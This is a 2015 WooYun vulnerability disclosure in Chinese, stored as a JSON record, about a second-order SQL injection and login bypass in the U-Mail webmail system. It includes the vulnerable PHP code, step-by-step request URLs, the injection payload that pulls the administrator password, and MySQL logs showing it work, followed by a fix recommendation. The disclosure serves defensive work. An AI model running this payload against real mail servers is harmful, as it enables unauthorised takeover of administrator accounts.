{"id": 44502, "wybug_id": "wooyun-2015-093488", "wybug_title": "U-Mail邮件系统二次注入2（无需登录，可批量直接获取管理员密码）", "wybug_corp": "U-Mail", "wybug_author": "Ano_Tom", "wybug_date": "2015-01-23 11:06", "wybug_open_date": "2015-04-23 11:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-31：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-23：\t细节向公众公开  简要描述： 声明:不是故意刷漏洞，只是每天打完LOL后分析下，找到一个提交一个，见谅。我卡牌玩的还是很6的。:) 详细说明：  漏洞文件/fast/oab/module/operates.php代码与上一个二次注入缺陷原理都一样，这次是另一个文件，是无需登录的\nif ( ACTION == \"save-to-pab\" ){\t\tinclude_once( LIB_PATH.\"PAB.php\" );\t\t$PAB = PAB::getinstance( );\t\t$maillist_id = trim( $_GET['maillist'] );\t\tif ( $maillist_id )\t\t{\t\t\t\t......\t\t}\t\telse\t\t{\t\t\t\t$user_ids = trim( $_GET['userlist'] );\t\t\t\tif ( !$user_ids )\t\t\t\t{\t\t\t\t\t\tdump_msg( \"param_error\", \"参数错误！\" );\t\t\t\t}\t\t\t\t$where = \"t1.UserID IN (\".$user_ids.\")\";//这里是之前提交的一个注入\t\t\t\t$arr_tmp = $Mailbox->getMailboxInfo( $domain_id, $where, \"\", \"\", \"\", \"\", 0 );//此处是从数据库里读出用户数据\t\t\t\t$user_all = $arr_tmp['data'];\t\t\t\tif ( !$user_all )\t\t\t\t{\t\t\t\t\t\tdump_json( array( \"status\" => TRUE, \"message\" => \"\" ) );\t\t\t\t}\t\t\t\tforeach ( $user_all as $user )\t\t\t\t{\t\t\t\t\t\t$qq = $msn = \"\";\t\t\t\t\t\tif ( strpos( $user['qqmsn'], \"@\" ) )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$msn = $user['qqmsn'];\t\t\t\t\t\t}\t\t\t\t\t\telse\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$qq = $user['qqmsn'];\t\t\t\t\t\t}\t\t\t\t\t\tif ( !$PAB->getContactByMail( $user_id, $user['email'], \"contact_id\", 0 ) )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$data = array(\t\t\t\t\t\t\t\t\t\t\"user_id\" => $user_id,\t\t\t\t\t\t\t\t\t\t\"fullname\" => $user['FullName'],//将读出的数据未经处理\t\t\t\t\t\t\t\t\t\t\"pref_email\" => $user['email'],\t\t\t\t\t\t\t\t\t\t\"pref_tel\" => $user['teleextension'] ? $user['teleextension'] : $user['mobil'],\t\t\t\t\t\t\t\t\t\t\"birthday\" => $user['birthday'],\t\t\t\t\t\t\t\t\t\t\"im_qq\" => $qq,\t\t\t\t\t\t\t\t\t\t\"im_msn\" => $msn,\t\t\t\t\t\t\t\t\t\t\"updated\" => date( \"Y-m-d H:i:s\" )\t\t\t\t\t\t\t\t);\t\t\t\t\t\t\t\t$res = $PAB->add_contact( $data, 0 );//将从读出的数据未经处理，直接执行了插入操作\t\t\t\t\t\t\t\tif ( !$res )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\tdump_json( array( \"status\" => FALSE, \"message\" => \"添加联系人时发生错误，添加失败！\" ) );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t}\t\t}\t\tdump_json( array( \"status\" => TRUE, \"message\" => \"\" ) );}\n我们寻找可控的用户数据输入，代码在/fast/option/module/o_userinfo.php为\nif ( !defined( \"PRELOAD_OK\" ) ){\t\texit( \"error\" );}$user_id = get_session( \"user_id\" );$domain_id = get_session( \"domain_id\" );if ( ACTION == \"userinfo\" ){\t\t$url = \"/webmail/fast/option/index.php?module=view&action=userinfo\";\t\t$where = \"UserID='\".$user_id.\"'\";\t\t$data = array(\t\t\t\t\"fullname\" => gss( $_POST['fullname'] )//修改姓名\t\t);\t\t$result = $Mailbox->update_mailbox( $data, $where, 0 );//修改姓名，执行更新操作\t\tif ( !$result )\t\t{\t\t\t\tredirect( $url, \"修改姓名时出现错误，修改失败！\" );\t\t}\t\t$data = array(\t\t\t\t\"sex\" => gss( $_POST['gender'] ),\t\t\t\t\"birthday\" => gss( $_POST['bd_year'] ).\"-\".gss( $_POST['bd_month'] ).\"-\".gss( $_POST['bd_day'] ),\t\t\t\t\"mobil\" => gss( $_POST['mobile'] ),\t\t\t\t\"teleextension\" => gss( $_POST['tel'] ),\t\t\t\t\"qqmsn\" => gss( $_POST['im'] )\t\t);\t\t$result = $Mailbox->update_info( $data, $where, 0 );//先修改用户个人信息，第一步\t\t$msg = $result ? \"\" : \"修改用户信息时出现错误，修改失败！\";\t\tredirect( $url );}\n无需登录的原因见之前的漏洞分析，其只验证了一个用户名，存在该用户名即认为登录成功，从而可执行之后的所有敏感函数，而系统又默认存在system帐号，所以可以利用。漏洞利用过程为向http://mail.fuck.com/webmail/fast/index.php?module=operate&action=login post如下数据mailbox=system@fuck.com&link=? 从而获得登录认证，如图\n\n然后执行修改中文名的功能，执行请求为，向http://mail.fuck.com/webmail/fast/option/index.php?module=operate&action=userinfo post数据，fullname=',`homepage`=(SELECT password from userlist where userid=2)# 如图 \n\n然后执行如下操作，\n\n\n150123 10:12:23\t 2720 Connect\tumail@localhost on \t\t 2720 Query\tSET NAMES 'UTF8'\t\t 2720 Init DB\tumail\t\t 2720 Query\tUPDATE userlist SET `fullname`='\\',`homepage`=(SELECT password from userlist where userid=2)#' WHERE UserID='2'\t\t 2720 Query\tUPDATE mailuserinfo SET `sex`='',`birthday`='--',`mobil`='',`teleextension`='',`qqmsn`='' WHERE UserID='2'\t\t 2720 Quit\n更新操作为\n150123 10:15:48\t 2723 Connect\tumail@localhost on \t\t 2723 Query\tSET NAMES 'UTF8'\t\t 2723 Init DB\tumail\t\t 2723 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0 AND t1.UserID IN (2)\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC\t\t 2723 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0 AND t1.UserID IN (2)\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC\t\t 2723 Quit\t150123 10:15:50\t 2678 Query\tSELECT DomainName from domains\t\t 2678 Query\tSELECT UserID, Mailbox, FullName, MailDir, Password, AutoDecode, IsForwarding, AllowAccess, AllowChangeViaEmail, KeepForwardedMail, HideFromEveryone, EncryptMail, ApplyQuotas, EnableMultiPop, CanModifyGAB, CalendarOnly, MaxMessageCount, MaxDiskSpace, UserList.DomainID, Domains.DomainName, Domains.DomainID FROM UserList, Domains WHERE UserList.DomainID=Domains.DomainID AND FullName = 'mdaemon server' AND DomainName = 'fuck.com'\t\t 2678 Query\tSELECT DomainName from domains\t\t 2678 Query\tSELECT * FROM Domains\n发现其并未执行insert操作，原因是，if ( !$PAB->getContactByMail( $user_id, $user['email'], \"contact_id\", 0 ) )即当查不到数据时候才可以，所以此处还是使用一个普通的用户名来获取system管理的密码获得管理过程为，首先执行获得session\n\n第二步，更改用户信息http://mail.fuck.com/webmail/fast/option/index.php?module=operate&action=userinfo post数据为fullname=',`homepage`=(SELECT password from userlist where userid=2)#\n\n第三步，获取用户的useridhttp://mail.fuck.com/webmail/fast/oab/index.php?module=operate&action=member-get&page=1&orderby=&is_reverse=1&keyword=test0008\n\n第四步，执行修改操作http://mail.fuck.com/webmail/fast/oab/index.php?module=operate&action=save-to-pab&userlist=10\n\n第五步，发现虽然更新了数据，但并无法查看到个人的信息，多次查找发现，有一处导出通讯录的功能可使用，因而构造请求http://mail.fuck.com/webmail/fast/pab/index.php?module=operate&action=contact-export即可，结果如图\n\n获得管理员密码，即获得整个系统的控制权限，整个sql执行的过程为\n150123 10:28:14\t 2744 Connect\tumail@localhost on \t\t 2744 Query\tSET NAMES 'UTF8'\t\t 2744 Init DB\tumail\t\t 2744 Query\tUPDATE userlist SET `fullname`='\\',`homepage`=(SELECT password from userlist where userid=2)#' WHERE UserID='10'\t\t 2744 Query\tUPDATE mailuserinfo SET `sex`='',`birthday`='--',`mobil`='',`teleextension`='',`qqmsn`='' WHERE UserID='10'\t\t 2744 Quit\n\n150123 10:29:50\t 2747 Connect\tumail@localhost on \t\t 2747 Query\tSET NAMES 'UTF8'\t\t 2747 Init DB\tumail\t\t 2747 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0 AND t1.UserID IN (10)\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC\t\t 2747 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0 AND t1.UserID IN (10)\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC\t\t 2747 Query\tSELECT contact_id FROM pab_contact WHERE user_id='10' AND pref_email='test0008@fuck.com' LIMIT 1\t\t 2747 Query\tINSERT INTO pab_contact SET `user_id`='10',`fullname`='',`homepage`=(SELECT password from userlist where userid=2)#',`pref_email`='test0008@fuck.com',`pref_tel`='',`birthday`='0000-00-00',`im_qq`='',`im_msn`='',`updated`='2015-01-23 10:29:50'\t\t 2747 Quit\n   漏洞证明：  如上   修复方案：  1.出库后继续入库也需要转义等处理2.fast的目录下的几个模块认证缺陷，其实这目录完全可以删除，client下的功能不都已经有了嘛   版权声明：转载请注明来源 Ano_Tom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-01-28 09:31 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}